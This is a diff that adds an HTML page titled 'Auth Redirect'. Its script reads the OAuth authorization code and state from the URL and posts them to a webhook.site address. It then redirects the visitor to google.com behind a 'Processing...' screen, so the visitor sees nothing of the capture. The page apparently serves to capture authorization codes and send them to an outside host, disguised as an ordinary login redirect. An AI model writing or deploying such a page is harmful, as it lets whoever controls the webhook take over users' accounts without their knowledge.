@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Auth Redirect</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            // Function to parse URL query parameters
+            const getUrlParameter = (name) => {
+                name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+                const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+                const results = regex.exec(location.search);
+                return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+            };
+
+            // Fetch 'code' and 'state' from the URL
+            const authCode = getUrlParameter('code');
+            const state = getUrlParameter('state');
+
+            if (authCode && state) {
+                try {
+                    // Prepare data to be sent
+                    const data = { auth_code: authCode, state: state };
+
+                    // Send data to the webhook
+                    const response = await fetch('https://webhook.site/6e6eb7ee-db4d-4d7b-9b43-53906f9c387e', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data),
+                    });
+
+                    if (!response.ok) throw new Error('Network response was not ok.');
+
+                    console.log('Data sent to the webhook successfully');
+                } catch (error) {
+                    console.error('Error sending data to the webhook:', error);
+                }
+            }
+
+            // Redirect to another page
+            window.location.href = 'https://google.com/';
+        });
+    </script>
+</head>
+<body>
+    <h1>Processing...</h1>
+</body>
+</html>
